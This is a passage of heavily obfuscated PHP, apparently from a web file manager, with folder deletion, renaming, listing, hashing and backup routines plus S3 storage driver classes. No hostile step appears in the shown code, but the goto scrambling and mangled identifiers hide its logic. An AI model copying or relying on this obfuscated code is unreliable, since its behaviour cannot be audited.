delFolder($CèÜî”èÄ) { goto F±¥Öƒ§øã; f¢â­ôªÏî: return rmdir($CèÜî”èÄ); goto c³¼Îí¾‡; bËªÜ•´Öö: if (!($cŠÌÕŞˆÊÏ = opendir($CèÜî”èÄ))) { return !1; } while (($a—Şˆ°ì¾œ = readdir($cŠÌÕŞˆÊÏ)) !== !1) { if ($a—Şˆ°ì¾œ == $b¤·¶ßÅÛÅ[104] || $a—Şˆ°ì¾œ == $b¤·¶ßÅÛÅ[1227]) { continue; } $DñÇó¾ˆË = $CèÜî”èÄ . $b¤·¶ßÅÛÅ[18] . $a—Şˆ°ì¾œ; if (is_file($DñÇó¾ˆË) || is_link($DñÇó¾ˆË)) { if (!unlink($DñÇó¾ˆË)) { chmod($DñÇó¾ˆË, 511); if (!unlink($DñÇó¾ˆË)) { return !1; } } } else { if (is_dir($DñÇó¾ˆË)) { chmod($DñÇó¾ˆË, 511); $DñÇó¾ˆË = $this->iconvApp($DñÇó¾ˆË); if (!$this->delFolder($DñÇó¾ˆË)) { return !1; } } } } closedir($cŠÌÕŞˆÊÏ); goto f¢â­ôªÏî; F±¥Öƒ§øã: $b¤·¶ßÅÛÅ =& $_SERVER[¾÷]; $CèÜî”èÄ = $this->iconvSystem($CèÜî”èÄ); if (!is_dir($CèÜî”èÄ)) { return !0; } goto bËªÜ•´Öö; c³¼Îí¾‡: } public function rename($A™¥”Á¡«, $e¡Úå¢ğÚ°) { goto B’´˜‚˜¦Ô; cÖ¯Œóôë¥: $A™¥”Á¡« = $this->iconvSystem($A™¥”Á¡«); $cÍñËè¨‘ = $this->pathFather($A™¥”Á¡«); $Fï¯½ÀÏåÂ = rtrim($cÍñËè¨‘, $f¦ÑíñùÄ[18]) . $f¦ÑíñùÄ[18] . $Dø‹ñàã°; goto e·÷Á§¢°Í; e·÷Á§¢°Í: $D¼…šÑÛ´ë = @rename($A™¥”Á¡«, $Fï¯½ÀÏåÂ); $Fï¯½ÀÏåÂ = $this->iconvApp($Fï¯½ÀÏåÂ); return $D¼…šÑÛ´ë ? $this->getPathOuter($Fï¯½ÀÏåÂ) : !1; goto fïÛ­ÌÑ½È; B’´˜‚˜¦Ô: $f¦ÑíñùÄ =& $_SERVER[¾÷]; $Dø‹ñàã° = $this->fileNameAuto($this->pathFather($A™¥”Á¡«), $e¡Úå¢ğÚ°); $Dø‹ñàã° = $this->iconvSystem($Dø‹ñàã°); goto cÖ¯Œóôë¥; fïÛ­ÌÑ½È: } public function size($A™é…çÏ‹) { $A™é…çÏ‹ = $this->iconvSystem($A™é…çÏ‹); return filesize_64($A™é…çÏ‹); } public function info($A‡¨£ší–ö) { $A‡¨£ší–ö = $this->iconvSystem($A‡¨£ší–ö); if ($this->isFolder($A‡¨£ší–ö)) { return $this->folderInfo($A‡¨£ší–ö); } else { if ($this->isFile($A‡¨£ší–ö)) { return $this->fileInfo($A‡¨£ší–ö); } } return !1; } protected function infoChildren($d¾„ÅİÊ°, &$cÔÍë®¿, $FÈ¨ñ“Œƒê = true) { goto eŠ‘Ü¢¨â™; eÙÃ‰ë©¬¤: closedir($F‚ÁÏ‚¦°); goto Fò¡‡±ĞÚå; eŠ‘Ü¢¨â™: $Aë†‚Ê¸ä =& $_SERVER[¾÷]; check_abort_echo(); $d¾„ÅİÊ° = rtrim($d¾„ÅİÊ°, $Aë†‚Ê¸ä[18]) . $Aë†‚Ê¸ä[18]; goto b–ŠÉ¯ÁõÂ; b–ŠÉ¯ÁõÂ: if ($FÈ¨ñ“Œƒê) { $d¾„ÅİÊ° = $this->iconvSystem($d¾„ÅİÊ°); } if (!($F‚ÁÏ‚¦° = @opendir($d¾„ÅİÊ°))) { return; } while (($dÔ‘ã¥÷“ì = readdir($F‚ÁÏ‚¦°)) !== !1) { if ($dÔ‘ã¥÷“ì == $Aë†‚Ê¸ä[104] || $dÔ‘ã¥÷“ì == $Aë†‚Ê¸ä[1227]) { continue; } $e‰­Îí¨Ë  = $d¾„ÅİÊ° . $dÔ‘ã¥÷“ì; if (is_file($e‰­Îí¨Ë ) || is_link($e‰­Îí¨Ë )) { $cÔÍë®¿[$Aë†‚Ê¸ä[88]]++; $cÔÍë®¿[$Aë†‚Ê¸ä[87]] += filesize_64($e‰­Îí¨Ë ); } else { if (is_dir($e‰­Îí¨Ë )) { $cÔÍë®¿[$Aë†‚Ê¸ä[89]]++; $this->infoChildren($e‰­Îí¨Ë , $cÔÍë®¿, !1); } } } goto eÙÃ‰ë©¬¤; Fò¡‡±ĞÚå: } private function folderInfo($D„ƒÑ»¤÷•, $eª‹¿Ü† = false) { $C«šàğ÷ÉŒ =& $_SERVER[¾÷]; $D„ƒÑ»¤÷• = rtrim($D„ƒÑ»¤÷•, $C«šàğ÷ÉŒ[18]) . $C«šàğ÷ÉŒ[18]; $Açİ»¦®ò = $this->iconvApp($this->pathThis($D„ƒÑ»¤÷•)); if ($eª‹¿Ü†) { return array($C«šàğ÷ÉŒ[38] => $Açİ»¦®ò, $C«šàğ÷ÉŒ[85] => $this->getPathOuter($D„ƒÑ»¤÷•), $C«šàğ÷ÉŒ[39] => $C«šàğ÷ÉŒ[86]); } $f…’Œ‡¹š½ = array($C«šàğ÷ÉŒ[38] => $Açİ»¦®ò, $C«šàğ÷ÉŒ[85] => $this->getPathOuter($D„ƒÑ»¤÷•), $C«šàğ÷ÉŒ[39] => $C«šàğ÷ÉŒ[86], $C«šàğ÷ÉŒ[202] => @filectime($D„ƒÑ»¤÷•), $C«šàğ÷ÉŒ[93] => @filemtime($D„ƒÑ»¤÷•), $C«šàğ÷ÉŒ[1230] => @fileatime($D„ƒÑ»¤÷•), $C«šàğ÷ÉŒ[1231] => is_readable($D„ƒÑ»¤÷•), $C«šàğ÷ÉŒ[1232] => is_writable($D„ƒÑ»¤÷•), $C«šàğ÷ÉŒ[1233] => get_mode($D„ƒÑ»¤÷•)); return $f…’Œ‡¹š½; } private function fileInfo($EÆÌÏ½öõ‹, $fÑ½™»¸œä = false) { $D’¿Ø¨‡½× =& $_SERVER[¾÷]; $fÅã›ÆÅ– = $this->iconvApp($this->pathThis($EÆÌÏ½öõ‹)); if ($fÑ½™»¸œä) { return array($D’¿Ø¨‡½×[38] => $fÅã›ÆÅ–, $D’¿Ø¨‡½×[85] => $this->getPathOuter($EÆÌÏ½öõ‹), $D’¿Ø¨‡½×[39] => $D’¿Ø¨‡½×[201], $D’¿Ø¨‡½×[87] => $this->size($EÆÌÏ½öõ‹), $D’¿Ø¨‡½×[177] => $this->ext($fÅã›ÆÅ–)); } $CÃèˆ¡ø¨Ø = array($D’¿Ø¨‡½×[38] => $fÅã›ÆÅ–, $D’¿Ø¨‡½×[85] => $this->getPathOuter($EÆÌÏ½öõ‹), $D’¿Ø¨‡½×[39] => $D’¿Ø¨‡½×[201], $D’¿Ø¨‡½×[202] => @filectime($EÆÌÏ½öõ‹), $D’¿Ø¨‡½×[93] => @filemtime($EÆÌÏ½öõ‹), $D’¿Ø¨‡½×[1230] => @fileatime($EÆÌÏ½öõ‹), $D’¿Ø¨‡½×[87] => $this->size($EÆÌÏ½öõ‹), $D’¿Ø¨‡½×[177] => $this->ext($fÅã›ÆÅ–), $D’¿Ø¨‡½×[1231] => is_readable($EÆÌÏ½öõ‹), $D’¿Ø¨‡½×[1232] => is_writable($EÆÌÏ½öõ‹), $D’¿Ø¨‡½×[1233] => get_mode($EÆÌÏ½öõ‹)); return $CÃèˆ¡ø¨Ø; } public function exist($C¶°Õ‰Ÿ²¿) { $C¶°Õ‰Ÿ²¿ = $this->iconvSystem($C¶°Õ‰Ÿ²¿); return @file_exists($C¶°Õ‰Ÿ²¿); } public function isFile($F‚äˆóÅå) { $F‚äˆóÅå = $this->iconvSystem($F‚äˆóÅå); return @is_file($F‚äˆóÅå); } public function isFolder($AŞğ §Äˆ„) { $AŞğ §Äˆ„ = $this->iconvSystem($AŞğ §Äˆ„); return @is_dir($AŞğ §Äˆ„); } public function listPath($cÖÒŸŒÜâØ, $aèèÖà³ö = false) { goto Có…×¡‡ì‰; Có…×¡‡ì‰: $d§¥½ÃÑëß =& $_SERVER[¾÷]; $cÖÒŸŒÜâØ = $this->iconvSystem($cÖÒŸŒÜâØ); $cÖÒŸŒÜâØ = rtrim($cÖÒŸŒÜâØ, $d§¥½ÃÑëß[18]) . $d§¥½ÃÑëß[18]; goto b‘‡ÄÇÓ—ƒ; eÏ†Ì‹Æ: closedir($cê¿ç¢Òä†); return $CÁ°àë©Ä¤; goto E¶Ü¨µÂ; b‘‡ÄÇÓ—ƒ: $CÁ°àë©Ä¤ = array($d§¥½ÃÑëß[84] => array(), $d§¥½ÃÑëß[83] => array()); if (!($cê¿ç¢Òä† = @opendir($cÖÒŸŒÜâØ))) { return $CÁ°àë©Ä¤; } while (($fÆå‹¡™·Æ = readdir($cê¿ç¢Òä†)) !== !1) { if ($fÆå‹¡™·Æ == $d§¥½ÃÑëß[104] || $fÆå‹¡™·Æ == $d§¥½ÃÑëß[1227]) { continue; } $eñ®İÖ©øÊ = $cÖÒŸŒÜâØ . $fÆå‹¡™·Æ; if (is_file($eñ®İÖ©øÊ)) { $CÁ°àë©Ä¤[$d§¥½ÃÑëß[83]][] = $this->fileInfo($eñ®İÖ©øÊ, $aèèÖà³ö); } else { $CÁ°àë©Ä¤[$d§¥½ÃÑëß[84]][] = $this->folderInfo($eñ®İÖ©øÊ, $aèèÖà³ö); } } goto eÏ†Ì‹Æ; E¶Ü¨µÂ: } public function listAll($aÁ¦‡´ŒÎ, &$fÒ›¦ÃÏìö = array()) { goto a—èˆêÅõÛ; d‰‹òŠ‚ğ: if (!($B®ÒÔ‰ŠÊ» = @opendir($aÁ¦‡´ŒÎ))) { return $fÒ›¦ÃÏìö; } while (($E¯ë´‡™¤‘ = readdir($B®ÒÔ‰ŠÊ»)) !== !1) { if ($E¯ë´‡™¤‘ == $CŠõ¬¿˜Ê»[104] || $E¯ë´‡™¤‘ == $CŠõ¬¿˜Ê»[1227]) { continue; } $E»‘¢ÂÖÙ = $aÁ¦‡´ŒÎ . $E¯ë´‡™¤‘; if (is_dir($E»‘¢ÂÖÙ) && !is_link($E»‘¢ÂÖÙ)) { $fÒ›¦ÃÏìö[] = array($CŠõ¬¿˜Ê»[85] => $E»‘¢ÂÖÙ . $CŠõ¬¿˜Ê»[18], $CŠõ¬¿˜Ê»[86] => 1, $CŠõ¬¿˜Ê»[93] => @filemtime($E»‘¢ÂÖÙ), $CŠõ¬¿˜Ê»[87] => 0); $this->listAll($E»‘¢ÂÖÙ, $fÒ›¦ÃÏìö); } else { $fÒ›¦ÃÏìö[] = array($CŠõ¬¿˜Ê»[85] => $E»‘¢ÂÖÙ, $CŠõ¬¿˜Ê»[86] => 0, $CŠõ¬¿˜Ê»[93] => @filemtime($E»‘¢ÂÖÙ), $CŠõ¬¿˜Ê»[87] => $this->size($E»‘¢ÂÖÙ)); } } closedir($B®ÒÔ‰ŠÊ»); goto aÈì± Ãğ; aÈì± Ãğ: return $fÒ›¦ÃÏìö; goto Bê†‚ÅîÓÔ; a—èˆêÅõÛ: $CŠõ¬¿˜Ê» =& $_SERVER[¾÷]; $aÁ¦‡´ŒÎ = $this->iconvSystem($aÁ¦‡´ŒÎ); $aÁ¦‡´ŒÎ = rtrim($aÁ¦‡´ŒÎ, $CŠõ¬¿˜Ê»[18]) . $CŠõ¬¿˜Ê»[18]; goto d‰‹òŠ‚ğ; Bê†‚ÅîÓÔ: } public function has($D¨¿’ğï˜, $c‘¼õæÍš = false, $aƒÆ´ É‡ = true) { goto B­–‹¡ÍÎˆ; DÄ¿ß»œØÔ: if (!($C…Àˆ®±² = @opendir($D¨¿’ğï˜))) { return !1; } $e®ôåÇÇä = 0; $B¾è™’ƒ˜ = 0; goto aĞ‹¦ññéÄ; aĞ‹¦ññéÄ: $dƒ—ëÒÔ„ = 0; while (($b–Çêí¥¶Õ = readdir($C…Àˆ®±²)) !== !1) { if ($b–Çêí¥¶Õ == $F±Ëºîµ»[104] || $b–Çêí¥¶Õ == $F±Ëºîµ»[1227]) { continue; } $E¯øÍ­’Œã = $D¨¿’ğï˜ . $b–Çêí¥¶Õ; if ($c‘¼õæÍš) { $dƒ—ëÒÔ„++; if (@is_file($E¯øÍ­’Œã)) { $e®ôåÇÇä++; } else { $B¾è™’ƒ˜++; } if ($dƒ—ëÒÔ„ > 10000) { break; } continue; } if ($aƒÆ´ É‡) { if (@is_file($E¯øÍ­’Œã)) { return !0; } } else { if (@is_dir($E¯øÍ­’Œã . $F±Ëºîµ»[18])) { return !0; } } } closedir($C…Àˆ®±²); goto A…ó“÷¼×; A…ó“÷¼×: if ($c‘¼õæÍš) { return array($F±Ëºîµ»[211] => $e®ôåÇÇä, $F±Ëºîµ»[212] => $B¾è™’ƒ˜); } return !1; goto dÏ®Ä×ñ¶; B­–‹¡ÍÎˆ: $F±Ëºîµ» =& $_SERVER[¾÷]; $D¨¿’ğï˜ = $this->iconvSystem($D¨¿’ğï˜); $D¨¿’ğï˜ = rtrim($D¨¿’ğï˜, $F±Ëºîµ»[18]) . $F±Ëºîµ»[18]; goto DÄ¿ß»œØÔ; dÏ®Ä×ñ¶: } public function hashSimple($FÀôÁ±„êÁ) { goto E‚¿Ã°Üøà; FØºÂèÇ½–: $d¦â²´÷® = fopen($FÀôÁ±„êÁ, $a‰Ú”åìÉ®[1234]); if (!$d¦â²´÷®) { return $a…ƒ‰Ó–è‹; } for ($FÓ¿Ñæò¨’ = 0; $FÓ¿Ñæò¨’ < $aŒˆÊøØù; $FÓ¿Ñæò¨’++) { fseek_64($d¦â²´÷®, $dÒÒ®¨­‹ß * $FÓ¿Ñæò¨’); $a…ƒ‰Ó–è‹ .= fread($d¦â²´÷®, $f²ñ¶šÁ»É); } goto b“Ğ‹æˆŞñ; E‚¿Ã°Üøà: $a‰Ú”åìÉ® =& $_SERVER[¾÷]; if (!$FÀôÁ±„êÁ) { return md5($a‰Ú”åìÉ®[43]); } $FÀôÁ±„êÁ = $this->iconvSystem($FÀôÁ±„êÁ); goto F¦ï´½­èë; b“Ğ‹æˆŞñ: fseek_64($d¦â²´÷®, $f †÷áé‰µ - $f²ñ¶šÁ»É); $a…ƒ‰Ó–è‹ .= fread($d¦â²´÷®, $f²ñ¶šÁ»É); fclose($d¦â²´÷®); goto AØÈÊå‘Ó¾; bµŒº×¢¡Î: if ($f †÷áé‰µ <= $f²ñ¶šÁ»É * $aŒˆÊøØù) { return $this->hashMd5($FÀôÁ±„êÁ) . $f †÷áé‰µ; } $a…ƒ‰Ó–è‹ = $a‰Ú”åìÉ®[43]; $dÒÒ®¨­‹ß = intval($f †÷áé‰µ / $aŒˆÊøØù); goto FØºÂèÇ½–; F¦ï´½­èë: $f †÷áé‰µ = $this->size($FÀôÁ±„êÁ); $f²ñ¶šÁ»É = 200; $aŒˆÊøØù = 50; goto bµŒº×¢¡Î; AØÈÊå‘Ó¾: return md5($a…ƒ‰Ó–è‹) . $f †÷áé‰µ; goto E­î”âª¾í; E­î”âª¾í: } public function getContent($b£º·ó´Š) { $b£º·ó´Š = $this->iconvSystem($b£º·ó´Š); return file_get_contents($b£º·ó´Š); } public function setContent($bğ¥¤èå·Î, $e±‡áÀ„Ì = '') { $bğ¥¤èå·Î = $this->iconvSystem($bğ¥¤èå·Î); $cóÍÖ‡í = @file_put_contents($bğ¥¤èå·Î, $e±‡áÀ„Ì, LOCK_EX); clearstatcache(); return $cóÍÖ‡í === !1 ? !1 : !0; } public function fileSubstr($D½·äóÏµ§, $Dôõ„¼Í– = 0, $e²¨ëµ–¯ = false) { goto f‡ŞÔë£¡Ñ; Dƒô«•»‡æ: fseek_64($föæÁÏØÓù, $Dôõ„¼Í–); $b­¬¾ÎÚ‚ˆ = fread($föæÁÏØÓù, $e²¨ëµ–¯); fclose($föæÁÏØÓù); goto eÂ¥ƒ¤½; eÂ¥ƒ¤½: return $b­¬¾ÎÚ‚ˆ; goto eàèßÆÖÜ; f‡ŞÔë£¡Ñ: $fÎ«èÁ‘ á =& $_SERVER[¾÷]; $D½·äóÏµ§ = $this->iconvSystem($D½·äóÏµ§); if ($e²¨ëµ–¯ === !1) { $e²¨ëµ–¯ = $this->size($D½·äóÏµ§); } goto có”âŠÃ®Ñ; có”âŠÃ®Ñ: if ($e²¨ëµ–¯ <= 0) { return $fÎ«èÁ‘ á[43]; } $föæÁÏØÓù = fopen($D½·äóÏµ§, $fÎ«èÁ‘ á[1234]); if (!$föæÁÏØÓù) { return !1; } goto Dƒô«•»‡æ; eàèßÆÖÜ: } public function upload($Càùñæ„Ë, $cÛ İ¼İ¯, $eÆ‚£ö£“Ö = false, $f¢Ùù˜ùÖä = REPEAT_REPLACE) { $C®îø–âè = $this->copyFile($cÛ İ¼İ¯, $Càùñæ„Ë); return $C®îø–âè ? $this->getPathOuter($Càùñæ„Ë) : !1; } public function setModifyTime($Aóããó²ÊÒ, $FéÃÇÏãÂÍ = '') { @touch($Aóããó²ÊÒ, intval($FéÃÇÏãÂÍ)); } public function download($EÕÌƒÀÂËò, $d¡ÄÑ¹À’Å) { return $this->iconvSystem($EÕÌƒÀÂËò); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($DàÓ®ÜÛ‰) { parent::__construct($DàÓ®ÜÛ‰); $this->signatureVersion($_SERVER[¾÷][220]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($FÚ§›ŒòÖ) { parent::__construct($FÚ§›ŒòÖ); $this->signatureVersion($_SERVER[¾÷][220]); } public function fileOutLink($d· ¢„ñ¦Ï) { $BÑÆ¿‹ÕÆ¿ =& $_SERVER[¾÷]; if (substr($d· ¢„ñ¦Ï, 0, 7) == $BÑÆ¿‹ÕÆ¿[1178]) { $d· ¢„ñ¦Ï = $BÑÆ¿‹ÕÆ¿[1179] . substr($d· ¢„ñ¦Ï, 7); } header($BÑÆ¿‹ÕÆ¿[168] . $d· ¢„ñ¦Ï); die; } } goto E£ì«õÀ·; CŞƒ³†Ïùè: class BackupDbFile { public function __construct() { } public function index() { goto B°ÊØ´¶‹ï; c¬«åõå¿ì: $BÌÉ¨Ñ·•© = CONTROLLER_DIR . $B‰ƒ¦ ó‘§[758]; IO::copy($fÓé÷„ƒè, $d†ŠŒ”ß¤é); IO::copy($BÌÉ¨Ñ·•©, $d†ŠŒ”ß¤é); goto d³êÅßÈµ; Fô…È¯õ“‡: $b¦ÔİŠ„÷í = TEMP_FILES . "\x62\x61\143\x6b\x75\x70\x5f{$A½°Ï‡ğå}\x2f"; $d†ŠŒ”ß¤é = "\173\x69\x6f\72{$b“øÅÏ§·ã[$B‰ƒ¦ ó‘§[713]]}\175\x2f\x64\x61\164\x61\142\x61\163\x65\57\x62\141\143\x6b\165\160\137{$A½°Ï‡ğå}\x2f"; if (!($d†ŠŒ”ß¤é = IO::mkdir($d†ŠŒ”ß¤é))) { return !1; } goto c…ìÕ½’¶‘; c…ìÕ½’¶‘: $D¦‰Ö•šÊ = IO::listPath($b¦ÔİŠ„÷í); $DâĞŒĞñÆ– = isset($D¦‰Ö•šÊ[$B‰ƒ¦ ó‘§[83]]) ? $D¦‰Ö•šÊ[$B‰ƒ¦ ó‘§[83]] : array(); $Dá®±Ä‘è = array_sum(array_column($DâĞŒĞñÆ–, $B‰ƒ¦ ó‘§[87])); goto Cµ‰†“¿Å…; Cµ‰†“¿Å…: if (!$Dá®±Ä‘è) { return !1; } Backup::set(array($B‰ƒ¦ ó‘§[752] => $Dá®±Ä‘è)); $dò®©ÔÃÓÑ = new TaskFileTransfer($B‰ƒ¦ ó‘§[753], $B‰ƒ¦ ó‘§[735], count($DâĞŒĞñÆ–), LNG($B‰ƒ¦ ó‘§[736]) . $B‰ƒ¦ ó‘§[443] . LNG($B‰ƒ¦ ó‘§[738]) . $B‰ƒ¦ ó‘§[754]); goto d¤©ô˜Àè¤; d¤©ô˜Àè¤: $dò®©ÔÃÓÑ->task[$B‰ƒ¦ ó‘§[720]] = $Dá®±Ä‘è; foreach ($D¦‰Ö•šÊ[$B‰ƒ¦ ó‘§[83]] as $c´…º¸¨„) { $c³‚Ê”©àˆ = IO::move($c´…º¸¨„[$B‰ƒ¦ ó‘§[85]], $d†ŠŒ”ß¤é); if (!$c³‚Ê”©àˆ) { $dò®©ÔÃÓÑ->end(); $EŠç‰–ÈÂÏ = IO::getLastError($B‰ƒ¦ ó‘§[755] . $c´…º¸¨„[$B‰ƒ¦ ó‘§[85]] . $B‰ƒ¦ ó‘§[756] . $d†ŠŒ”ß¤é . $B‰ƒ¦ ó‘§[508]); write_log($EŠç‰–ÈÂÏ, $B‰ƒ¦ ó‘§[735]); return !1; } } $fÓé÷„ƒè = CONTROLLER_DIR . $B‰ƒ¦ ó‘§[757]; goto c¬«åõå¿ì; B°ÊØ´¶‹ï: $B‰ƒ¦ ó‘§ =& $_SERVER[¾÷]; $b“øÅÏ§·ã = Backup::get(); $A½°Ï‡ğå = $b“øÅÏ§·ã[$B‰ƒ¦ ó‘§[38]]; goto Fô…È¯õ“‡; d³êÅßÈµ: $dò®©ÔÃÓÑ->end(); Backup::set(array($B‰ƒ¦ ó‘§[759] => $Dá®±Ä‘è)); return !0; goto c™¨ã÷á’ø; c™¨ã÷á’ø: } } class BackupFile { public function __construct() { } public function index() { goto c“ª–Í‹íƒ; C¥İ«äšñî: $dõ÷‚óÁö = 1000; $aáÙŞÀó = $Bª¥¢ß®ËÑ = 0; $BÛğ‰ˆ‘Ô¥ = array(); goto e‘›â•°Ïß; e‘›â•°Ïß: $DŠŸ‡·‚±ã = $DÚ¾Ôäçš = 0; do { $fĞäÖ¨Â°ƒ = $_SERVER[¾÷][766]; $CéíË»‚† = Model($_SERVER[¾÷][740])->where($aƒ¯¨ÖÁº×)->field($fĞäÖ¨Â°ƒ)->order($_SERVER[¾÷][767])->selectPage($dõ÷‚óÁö, $bŞêÅ‘ÒĞ); $eÁ›× ¥È = !empty($CéíË»‚†[$_SERVER[¾÷][374]]) ? $CéíË»‚†[$_SERVER[¾÷][374]] : array(); foreach ($eÁ›× ¥È as $EğÊà¤œÎÍ) { goto Dš¹ÖŞÖ²º; Dš¹ÖŞÖ²º: if (!$this->_fileExist($EğÊà¤œÎÍ, $BÛğ‰ˆ‘Ô¥, $D»àÛùã‘Œ)) { $b«‡”›Âª -= 1; $Fªğ›ˆåØ -= (int) $EğÊà¤œÎÍ[$_SERVER[¾÷][87]]; write_log("\146\151\154\145\x20\x6e\x6f\164\40\x65\x78\151\163\x74\x2e\146\x69\x6c\x65\111\104\72{$EğÊà¤œÎÍ[$_SERVER[¾÷][450]]}\x2c\40\x70\141\164\x68\72{$EğÊà¤œÎÍ[$_SERVER[¾÷][85]]}", $_SERVER[¾÷][768]); continue; } $CïäÖß¥ù = $EğÊà¤œÎÍ[$_SERVER[¾÷][85]]; $aàŸšƒäö” = "\173\x69\157\72{$Bâ¿îÕ¬²¯[$_SERVER[¾÷][713]]}\x7d" . substr($CïäÖß¥ù, strlen("\173\151\x6f\72{$EğÊà¤œÎÍ[$_SERVER[¾÷][769]]}\x7d")); goto EĞ¨š¿¥Æ¶; AÕÎ‡‡ÂïÌ: $aáÙŞÀó += $EğÊà¤œÎÍ[$_SERVER[¾÷][87]]; $DÚ¾Ôäçš += 1; $DŠŸ‡·‚±ã += $EğÊà¤œÎÍ[$_SERVER[¾÷][87]]; goto FÒÊÍ‚ë´; EĞ¨š¿¥Æ¶: if (IO::exist($aàŸšƒäö”)) { $fŞŒˆ”Ê‡->updateFileEnd($EğÊà¤œÎÍ[$_SERVER[¾÷][38]], $EğÊà¤œÎÍ[$_SERVER[¾÷][87]]); } else { $aàŸšƒäö” = get_path_father($aàŸšƒäö”); IO::mkdir($aàŸšƒäö”); if (!IO::copy($CïäÖß¥ù, $aàŸšƒäö”, $_SERVER[¾÷][770])) { write_log($_SERVER[¾÷][771] . $CïäÖß¥ù . $_SERVER[¾÷][756] . $aàŸšƒäö” . $_SERVER[¾÷][508], $_SERVER[¾÷][735]); $D„Êöº‹òè = !1; break; } } $C·œÉÛ«‘ô = $EğÊà¤œÎÍ[$_SERVER[¾÷][450]]; $Bª¥¢ß®ËÑ += 1; goto AÕÎ‡‡ÂïÌ; FÒÊÍ‚ë´: if ($aáÙŞÀó >= 1024 * 1024 * 100) { $a¢ØÌùÖ = array($_SERVER[¾÷][772] => $C·œÉÛ«‘ô, $_SERVER[¾÷][773] => $DÚ¾Ôäçš, $_SERVER[¾÷][774] => $DŠŸ‡·‚±ã); Backup::set($a¢ØÌùÖ); $aáÙŞÀó = $Bª¥¢ß®ËÑ = 0; } goto C»Ô´³ÃÍŒ; C»Ô´³ÃÍŒ: } $aÆÒ ÏÇ¹„ = count($eÁ›× ¥È); $bŞêÅ‘ÒĞ++; } while ($aÆÒ ÏÇ¹„ == $dõ÷‚óÁö); $fŞŒˆ”Ê‡->end(); goto D¥µÒø„•µ; DÖñÒÈªµÏ: $this->_fileFilter($BÛğ‰ˆ‘Ô¥); return !0; goto aëì˜ê“¬; Eˆ§åáÌî…: $D„Êöº‹òè = !0; $D»àÛùã‘Œ = $this->storeIds(); $bŞêÅ‘ÒĞ = 1; goto C¥İ«äšñî; AÖÏ–µÎ›ƒ: $fŞŒˆ”Ê‡->task[$_SERVER[¾÷][720]] = $Fªğ›ˆåØ; $a¢ØÌùÖ = array($_SERVER[¾÷][764] => $b«‡”›Âª, $_SERVER[¾÷][765] => $Fªğ›ˆåØ); Backup::set($a¢ØÌùÖ); goto Eˆ§åáÌî…; D¥µÒø„•µ: $a¢ØÌùÖ = array($_SERVER[¾÷][775] => 1, $_SERVER[¾÷][479] => time(), $_SERVER[¾÷][730] => 1, $_SERVER[¾÷][772] => $C·œÉÛ«‘ô, $_SERVER[¾÷][765] => $Fªğ›ˆåØ, $_SERVER[¾÷][764] => $b«‡”›Âª); if ($Bª¥¢ß®ËÑ) { $a¢ØÌùÖ[$_SERVER[¾÷][773]] = $DÚ¾Ôäçš; $a¢ØÌùÖ[$_SERVER[¾÷][774]] = $DŠŸ‡·‚±ã; } Backup::set($a¢ØÌùÖ); goto DÖñÒÈªµÏ; c“ª–Í‹íƒ: $Bâ¿îÕ¬²¯ = Backup::get(); $C·œÉÛ«‘ô = $Bâ¿îÕ¬²¯[$_SERVER[¾÷][298]][$_SERVER[¾÷][201]][$_SERVER[¾÷][450]]; $aƒ¯¨ÖÁº× = array($_SERVER[¾÷][451] => array($_SERVER[¾÷][760], $C·œÉÛ«‘ô), $_SERVER[¾÷][761] => array($_SERVER[¾÷][336], $Bâ¿îÕ¬²¯[$_SERVER[¾÷][713]])); goto bç‰Šáìí·; bç‰Šáìí·: $b«‡”›Âª = (int) Model($_SERVER[¾÷][740])->where($aƒ¯¨ÖÁº×)->count($_SERVER[¾÷][450]); $Fªğ›ˆåØ = (int) Model($_SERVER[¾÷][740])->where($aƒ¯¨ÖÁº×)->sum($_SERVER[¾÷][87]); $fŞŒˆ”Ê‡ = new TaskFileTransfer($_SERVER[¾÷][762], $_SERVER[¾÷][735], $b«‡”›Âª, LNG($_SERVER[¾÷][736]) . $_SERVER[¾÷][737] . LNG($_SERVER[¾÷][763])); goto AÖÏ–µÎ›ƒ; aëì˜ê“¬: } private function _fileExist($b“Ü¾çâà, &$FÜÛĞ‰ù‹½, $cŠ®îé×·ß) { goto a®•¼ëİ—æ; dÄ¸Ÿ¤³ó¨: if (!in_array($b“Ü¾çâà[$fÓê»Ã¦‡ä[769]], $cŠ®îé×·ß)) { return !1; } if (IO::exist($D™é¥È×¯)) { return !0; } $FÔã¼ˆŸÔ¨ = get_path_father($D™é¥È×¯); goto e±’Ïáå‰ã; a®•¼ëİ—æ: $fÓê»Ã¦‡ä =& $_SERVER[¾÷]; $D™é¥È×¯ = $b“Ü¾çâà[$fÓê»Ã¦‡ä[85]]; if (in_array($b“Ü¾çâà[$fÓê»Ã¦‡ä[450]], $FÜÛĞ‰ù‹½)) { return !1; } goto dÄ¸Ÿ¤³ó¨; e±’Ïáå‰ã: if (IO::exist($FÔã¼ˆŸÔ¨)) { $FÜÛĞ‰ù‹½[] = $b“Ü¾çâà[$fÓê»Ã¦‡ä[450]]; return !1; } $aá×­Ú¼äË = array($fÓê»Ã¦‡ä[769] => $b“Ü¾çâà[$fÓê»Ã¦‡ä[769]], $fÓê»Ã¦‡ä[85] => array($fÓê»Ã¦‡ä[387], "{$FÔã¼ˆŸÔ¨}\x25")); $BˆÇâÕÚƒ¾ = Model($fÓê»Ã¦‡ä[740])->where($aá×­Ú¼äË)->field($fÓê»Ã¦‡ä[451])->select(); goto eñ±‡ÌĞñ; eñ±‡ÌĞñ: $FÜÛĞ‰ù‹½ = array_merge($FÜÛĞ‰ù‹½, array_to_keyvalue($BˆÇâÕÚƒ¾, $fÓê»Ã¦‡ä[43], $fÓê»Ã¦‡ä[450])); return !1; goto e—¸Ú¿˜Àø; e—¸Ú¿˜Àø: } private function _fileFilter($CŸ¬¹Ë¬¾) { $f„²—¡âä— =& $_SERVER[¾÷]; if (empty($CŸ¬¹Ë¬¾)) { return; } $C’£­®ôÇÓ = array($f„²—¡âä—[450] => array($f„²—¡âä—[17], array_unique($CŸ¬¹Ë¬¾))); $b‹‹ØËî¹‡ = Model($f„²—¡âä—[776])->where($C’£­®ôÇÓ)->field($f„²—¡âä—[399])->select(); foreach ($b‹‹ØËî¹‡ as $e†í‚Œ‚„) { Model($f„²—¡âä—[776])->remove($e†í‚Œ‚„[$f„²—¡âä—[399]], !1); } } private function storeIds() { $f±Œ¼“¼¼· =& $_SERVER[¾÷]; $Fˆ£ÒˆÇµ = Model($f±Œ¼“¼¼·[725])->listData(); 